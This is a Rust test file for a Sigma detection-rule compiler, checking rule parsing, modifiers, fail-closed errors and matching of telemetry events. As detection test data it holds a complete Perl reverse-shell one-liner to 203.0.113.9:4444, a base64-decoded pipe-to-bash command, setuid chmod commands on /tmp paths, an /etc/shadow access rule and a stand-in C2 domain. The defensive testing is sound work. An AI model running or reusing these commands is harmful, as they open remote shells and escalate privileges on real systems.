use detection::{compile_sigma_rule, EventClass, TelemetryEvent, TemporalEngine};

fn event(command: &str) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({
        "ts_unix": 1, "event_class": "ProcessExec", "pid": 42, "ppid": 1,
        "uid": 1000, "process": "bash", "parent_process": "sshd", "session_id": 42,
        "file_path": "/usr/bin/bash", "file_write": false, "command_line": command,
        "container_escape": false, "container_privileged": false
    }))
    .unwrap()
}
fn rule(selection: &str, condition: &str) -> String {
    format!("title: fidelity\nlogsource:\n  category: process_creation\ndetection:\n{selection}\n  condition: {condition}\n")
}
fn matches(yaml: &str, e: &TelemetryEvent) -> bool {
    let r = compile_sigma_rule(yaml).unwrap();
    assert_eq!(r.stages.len(), 1);
    r.stages[0].predicate.matches(e)
}
#[test]
fn boolean_conditions_are_same_event_not_temporal_or_flattened() {
    let y = rule("  a:\n    CommandLine|contains: alpha\n  b:\n    CommandLine|contains: beta\n  filter:\n    CommandLine|contains: benign", "(a and b) and not filter");
    assert!(!matches(&y, &event("alpha")));
    assert!(!matches(&y, &event("beta")));
    assert!(!matches(&y, &event("alpha beta benign")));
    assert!(matches(&y, &event("alpha beta")));
    let mut engine = TemporalEngine::new();
    engine.add_rule(compile_sigma_rule(&y).unwrap());
    assert_eq!(engine.observe(&event("alpha beta")), vec!["fidelity"]);
}
#[test]
fn condition_or_across_fields_and_wildcard_quantifiers() {
    let s =
        "  selection_a:\n    Image|endswith: /bash\n  selection_b:\n    CommandLine|contains: beta";
    assert!(matches(&rule(s, "1 of selection_*"), &event("alpha")));
    assert!(!matches(&rule(s, "all of selection_*"), &event("alpha")));
    assert!(matches(&rule(s, "all of them"), &event("beta")));
    assert!(matches(
        &rule(s, "selection_a or selection_b"),
        &event("alpha")
    ));
}
#[test]
fn modifiers_all_prefix_suffix_regex_and_globs() {
    assert!(!matches(
        &rule(
            "  selection:\n    CommandLine|contains|all: [alpha, beta]",
            "selection"
        ),
        &event("alpha")
    ));
    assert!(matches(
        &rule(
            "  selection:\n    CommandLine|startswith: alpha",
            "selection"
        ),
        &event("alpha beta")
    ));
    assert!(!matches(
        &rule(
            "  selection:\n    CommandLine|startswith: alpha",
            "selection"
        ),
        &event("x alpha")
    ));
    assert!(!matches(
        &rule("  selection:\n    CommandLine|endswith: beta", "selection"),
        &event("beta x")
    ));
    assert!(matches(
        &rule(
            "  selection:\n    CommandLine|re: '^alpha [0-9]+$'",
            "selection"
        ),
        &event("alpha 123")
    ));
    assert!(matches(
        &rule("  selection:\n    CommandLine: '*alpha?beta*'", "selection"),
        &event("x alpha beta y")
    ));
}
#[test]
fn image_path_modifiers_do_not_collapse_to_basename() {
    let mut e = event("bash");
    let y = rule("  selection:\n    Image|startswith: /tmp/", "selection");
    assert!(!matches(&y, &e));
    e.file_path = Some("/tmp/bash".into());
    assert!(matches(&y, &e));
}
#[test]
fn image_is_executable_path_not_target_path_or_basename() {
    assert!(!matches(
        &rule("  selection:\n    Image: bash", "selection"),
        &event("bash")
    ));
    let y = "title: image\nlogsource:\n  category: file_event\ndetection:\n  selection:\n    Image|endswith: /bash\n    TargetFilename: /etc/shadow\n  condition: selection";
    let mut e = event("");
    e.event_class = EventClass::FileOpen;
    e.file_path = Some("/etc/shadow".into());
    assert!(matches(y, &e));
}
#[test]
fn parent_image_basename_preserves_path_boundary() {
    let y = rule("  selection:\n    ParentImage|endswith: /sshd", "selection");
    let mut e = event("bash");
    assert!(matches(&y, &e));
    e.parent_process = "not-sshd".into();
    assert!(!matches(&y, &e));
}
#[test]
fn unknown_fields_modifiers_auditd_and_conditions_fail_closed() {
    for s in [
        "ParentCommandLine: bash",
        "comm: bash",
        "CurrentDirectory: /tmp",
        "Name: bash",
        "User: root",
        "a0: tar",
        "CommandLine|base64: bash",
        "CommandLine|windash: bash",
        "CommandLine|cased: bash",
        "CommandLine|re: '['",
        "CommandLine|contains: ''",
    ] {
        let y = rule(
            &format!("  selection:\n    CommandLine|contains: bash\n    {s}"),
            "selection",
        );
        assert!(compile_sigma_rule(&y).is_err(), "accepted {s}");
    }
    for c in [
        "selection | count() > 1",
        "selection and missing",
        "1 of missing*",
        "selection xor selection",
        "(selection",
        "selection)",
    ] {
        assert!(
            compile_sigma_rule(&rule("  selection:\n    Image: bash", c)).is_err(),
            "accepted {c}"
        );
    }
}
#[test]
fn unobservable_sources_and_foreign_platform_are_rejected() {
    for ls in [
        "category: proxy",
        "category: webserver",
        "category: process_creation\n  service: auditd",
        "category: process_creation\n  product: plan9",
    ] {
        let y = format!("title: gate\nlogsource:\n  {ls}\ndetection:\n  selection:\n    CommandLine|contains: bash\n  condition: selection");
        assert!(compile_sigma_rule(&y).is_err(), "accepted {ls}");
    }
    let foreign = if cfg!(target_os = "windows") {
        "linux"
    } else {
        "windows"
    };
    assert!(compile_sigma_rule(&format!("logsource:\n  category: process_creation\n  product: {foreign}\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10")).is_err());
    assert!(compile_sigma_rule(&rule("  selection: [bash]", "selection")).is_err());
}
#[test]
fn whitespace_dollar_and_caret_are_literal() {
    for needle in [" add ", "$env:", "${IFS}", "^caret$"] {
        let y = rule(
            &format!("  selection:\n    CommandLine|contains: '{needle}'"),
            "selection",
        );
        assert!(matches(&y, &event(&format!("before{needle}after"))));
        if needle == " add " {
            assert!(!matches(&y, &event("address")));
        }
    }
    let y = "title: spaces\ndetection:\n  sequence:\n    - event_class: process_exec\n      command_line_contains: [' add ']\n      within_secs: 10";
    assert!(!matches(y, &event("address")));
}
#[test]
fn network_domain_cidr_and_uid_mapping() {
    let y = "title: net\nlogsource:\n  category: network_connection\ndetection:\n  selection:\n    DestinationHostname|endswith: .evil.example\n    DestinationIp|cidr: 203.0.113.0/24\n    DestinationPort: 443\n    uid: 1000\n  condition: selection";
    let mut e = event("");
    e.event_class = EventClass::NetworkConnect;
    e.dst_domain = Some("c2.evil.example".into());
    e.dst_ip = Some("203.0.113.9".into());
    e.dst_port = Some(443);
    assert!(matches(y, &e));
    e.dst_ip = Some("198.51.100.9".into());
    assert!(!matches(y, &e));
    let dns = "title: dns\nlogsource:\n  category: dns\ndetection:\n  selection:\n    query: evil.example\n  condition: selection";
    e.event_class = EventClass::DnsQuery;
    e.dst_domain = Some("evil.example".into());
    assert!(matches(dns, &e));
}
#[test]
fn malformed_sequence_constraints_fail_closed() {
    for constraint in [
        "process_any_of: {unexpected: bash}",
        "dst_port_any_of: [oops]",
        "command_line_contains: []",
    ] {
        let y = format!("title: invalid\ndetection:\n  sequence:\n    - event_class: process_exec\n      {constraint}\n      within_secs: 10");
        assert!(compile_sigma_rule(&y).is_err(), "accepted {constraint}");
    }
    for y in ["title: typo\nunknown_behavior: allow\ndetection:\n  sequence:\n    - event_class: process_exec\n      within_secs: 10", "title: hybrid\ndetection:\n  condition: selection\n  sequence:\n    - event_class: process_exec\n      within_secs: 10"] {
        assert!(compile_sigma_rule(y).is_err());
    }
}
#[test]
fn sequence_extra_keys_are_not_silently_ignored() {
    assert!(compile_sigma_rule("title: typo\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      command_line_contians: [attack]\n      within_secs: 10").is_err());
}
#[test]
fn sequence_exclusions_and_groups_are_and_constraints() {
    let y = "title: groups\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      command_line_all_groups: [[alpha, gamma], [beta]]\n      command_line_not_contains: [benign]\n      process_not_any_of: [ssh]\n      parent_not_any_of: [cron]\n      file_path_not_contains: [.pub]\n      within_secs: 10";
    assert!(!matches(y, &event("alpha")));
    assert!(matches(y, &event("alpha beta")));
    assert!(!matches(y, &event("alpha beta benign")));
}

// Exact upstream fixtures from SigmaHQ53423dac8742ef6a44fb73f23f049e84594a66ce.
// Only the test-only native product gate is removed for portable predicate replay.
#[test]
fn upstream_base64_pipe_matches_unquoted_agent_argv_not_shell_quote_artifact() {
    let yaml = include_str!("fixtures/sigmahq_base64_pipe.yml").replace("    product: linux\n", "");
    let mut e = event("sh -c echo ZWNobyBoaQ== | base64 -d | bash");
    e.process = "sh".into();
    e.file_path = Some("/usr/bin/sh".into());
    assert!(matches(&yaml, &e));
    e.command_line = Some("sh -c 'echo ZWNobyBoaQ== | base64 -d | bash'".into());
    assert!(
        !matches(&yaml, &e),
        "upstream suffix does not consume a shell quote"
    );
    e.command_line = Some("sh -c echo ZWNobyBoaQ== | base64 -d".into());
    assert!(
        !matches(&yaml, &e),
        "decoding without pipe-to-shell is not this rule"
    );
}

#[test]
fn upstream_perl_requires_complete_reverse_shell_not_socket_setup() {
    let yaml =
        include_str!("fixtures/sigmahq_perl_reverse_shell.yml").replace("    product: linux\n", "");
    let mut e = event(
        r#"perl -e use Socket;$i="203.0.113.9";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};"#,
    );
    e.process = "perl".into();
    e.file_path = Some("/usr/bin/perl".into());
    assert!(matches(&yaml, &e));
    e.command_line = Some(r#"perl -e use Socket;$i="203.0.113.9";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))"#.into());
    assert!(!matches(&yaml, &e));
}

#[test]
fn authored_setuid_writable_path_matches_mode_and_target_together() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
    let identity = "linux_setuid_setgid_writable_path";
    let fires = |command: &str| {
        let mut engine = TemporalEngine::new();
        for entry in std::fs::read_dir(&root).unwrap() {
            let path = entry.unwrap().path();
            if path.extension().and_then(|s| s.to_str()) != Some("yml") {
                continue;
            }
            if let Ok(rule) = compile_sigma_rule(
                &std::fs::read_to_string(path)
                    .unwrap()
                    .replace("  product: linux\n", ""),
            ) {
                engine.add_rule(rule);
            }
        }
        let mut e = event(command);
        e.process = "chmod".into();
        e.file_path = Some("/usr/bin/chmod".into());
        engine.observe(&e).iter().any(|name| name == identity)
    };
    for command in [
        "chmod u+s /tmp/bash",
        "chmod 4755 /dev/shm/x",
        "chmod g+s /var/tmp/y",
    ] {
        assert!(fires(command), "{command}");
    }
    for command in [
        "chmod u+s /usr/local/bin/tool",
        "chmod 755 /tmp/x",
        "chmod 1777 /tmp/d",
    ] {
        assert!(!fires(command), "{command}");
    }
    let yaml: serde_yaml::Value = serde_yaml::from_str(
        &std::fs::read_to_string(root.join("linux_setuid_setgid_writable_path.yml")).unwrap(),
    )
    .unwrap();
    assert_eq!(yaml["level"].as_str(), Some("medium"));
}
